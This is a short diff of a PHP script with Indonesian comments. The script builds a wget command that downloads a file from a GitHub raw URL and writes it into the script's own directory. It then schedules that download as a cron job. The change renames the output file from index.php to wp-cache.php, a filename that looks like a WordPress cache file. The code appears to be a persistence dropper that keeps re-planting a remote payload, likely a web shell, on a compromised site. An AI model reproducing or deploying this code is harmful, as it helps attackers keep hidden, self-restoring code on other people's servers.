@@ -6,7 +6,7 @@ $urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/nopass/main/rio
 $currentDirectory = dirname(__FILE__);
 
 // Buat perintah wget
-$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/index.php');
+$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/wp-cache.php');
 
 // Tugas Cron untuk mengunduh file setiap 30 detik
 $downloadCronCommand = '* * * * * ' . $downloadCommand;
